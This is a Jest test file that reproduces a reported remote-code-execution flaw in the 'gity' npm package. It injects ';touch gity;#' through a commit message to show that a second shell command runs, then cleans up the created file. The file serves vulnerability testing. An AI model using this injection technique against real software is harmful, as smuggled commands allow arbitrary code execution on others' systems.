//https://hackerone.com/reports/730111
test("Remote code execution in gity", () => {
  const Git = require("gity");
  const fs = require("fs");
  const path = "./gity";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    let git = Git()
      .add("*.js")
      .commit('-m "added js files";touch gity;#')
      .run(() => {
        file_exist = fs.existsSync(path);
        expect(file_exist).toBe(true);

        fs.unlink(path, function (err) {}); //deleting the file after creation
      });
  } catch (error) {}

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
